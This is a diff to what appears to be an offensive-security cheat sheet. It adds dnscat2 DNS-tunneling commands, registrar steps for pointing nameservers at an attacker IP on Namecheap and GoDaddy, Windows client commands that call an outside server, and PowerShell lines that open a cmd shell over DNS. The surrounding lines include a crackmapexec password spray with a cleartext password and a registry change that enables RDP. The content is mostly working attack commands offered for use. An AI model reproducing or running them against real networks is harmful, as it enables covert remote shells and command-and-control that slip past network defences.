@@ -181,6 +181,71 @@ cme spray pwd
 ```
 proxychains -q -f met.conf crackmapexec smb ips.txt -u 'willy' -p 'fdsfssdfDFG4'
 ```
+dnscat2 dns tunneling [setup authoritative ns on namecheap](https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md), [sauce](https://github.com/iagox86/dnscat2#usage), [binaries](https://downloads.skullsecurity.org/dnscat2/)
+```
+sudo ruby ./dnscat2.rb mydomain.com
+sudo dnscat2-server mydomain.com
+```
+```
+dnscat2-v0.07-client-win32.exe mydomain.com
+```
+dns tunneling setup on namecheap [sauce](https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md)
+```
+1. go to "Advanced DNS"
+2. add A record -> ns1 -> attacker ip
+3. add A record -> ns2 -> attacker ip
+4. add A record -> @ -> attacker ip
+5. scroll down -> PERSONAL DNS SERVER -> Register Nameserver
+6. click ADD NAMESERVER -> ns1 -> attacker ip
+7. click ADD NAMESERVER -> ns2 -> attacker ip
+8. check: Find Nameservers -> Custom Nameservers -> ns1.your.domain
+9. check: Find Nameservers -> Custom Nameservers -> ns2.your.domain
+10. wait ~ 30min
+```
+```
+.\dnscat2c.exe --dns server=13.13.13.13,port=53
+.\dnscat2c.exe your.domain
+```
+dns tunneling setup on godaddy [sauce](https://www.drchaos.com/post/dnscat2-dns-reverse-tunneling-thru-secure-networks)
+```
+1. go to "Manage DNS"
+2. add A record -> ns -> attacker ip
+3. add A record -> ns1 -> attacker ip
+4. add A record -> ns2 -> attacker ip
+5. add A record -> @ -> attacker ip
+6. add NS record -> ns1 -> ns1.your.domain
+7. add NS record -> ns2 -> ns2.your.domain
+8. scroll up -> "..." menu -> Host Names
+9. add -> ns1 -> attacker ip
+10. add -> ns2 -> attacker ip
+11. back to "DNS Management" -> scroll down -> Nameservers -> Using custom nameservers -> Change
+12. click Enter my own nameservers (advanced)
+13. add -> ns1.your.domain
+14. add -> ns2.your.domain
+15. click Save
+16. wait ~ 30min
+```
+```
+.\dnscat2c.exe --dns server=13.13.13.13,port=53
+.\dnscat2c.exe your.domain
+```
+dnscat2 powershell [sauce](https://github.com/lukebaggett/dnscat2-powershell)
+```
+# Start a command session, and send DNS requests to 8.8.8.8 on port 53:
+Start-Dnscat2 -Domain <dnscat2 server> -DNSServer 8.8.8.8
+```
+```
+# Send a cmd shell, and send DNS requests to the default DNS Server set in Windows:
+Start-Dnscat2 -Domain <dnscat2 server> -Exec cmd
+```
+```
+# Start a console session. Only use CNAME, MX, and AAAA requests:
+Start-Dnscat2 -Domain <dnscat2 server> -LookupTypes @("CNAME","MX","AAAA") -Console
+```
+```
+# Do not encrypt the session. Encryption is enabled by default.
+Start-Dnscat2 -Domain <dnscat2 server> -NoEncryption
+```
 enable rdp
 ```
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
